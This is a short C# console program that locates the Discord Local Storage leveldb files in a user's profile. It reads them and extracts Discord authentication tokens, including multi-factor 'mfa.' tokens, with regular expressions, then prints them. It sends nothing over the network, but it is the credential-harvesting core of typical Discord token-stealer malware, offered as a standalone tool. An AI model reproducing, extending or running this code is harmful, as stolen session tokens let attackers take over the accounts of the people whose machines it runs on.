using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;
using System.Text;
using System.Security.Principal;

namespace TokenFinderConsole
{
    class Program
    {

        private static bool tokenIs = false;

        static void Main()
        {
            var msg = CToken();

            if (tokenIs)
            {

                ExtractToken(msg);
            }


        }

        public static List<string> CToken()
        {
            List<string> tokenList = new List<string>();
            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");

            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
            {
                string readedfile = file.OpenText().ReadToEnd();

                //pattern for discord tokens
                foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    tokenList.Add(match.Value + "\n");

                foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
                    tokenList.Add(match.Value + "\n");
            }


            tokenList = tokenList.ToList();
            tokenIs = true;

            return tokenList;
        }

        static void ExtractToken(List<string> message)
        {
            Console.WriteLine("Discord-Tokens: \n\n" + string.Join("\n", message));
        }

    }

    }
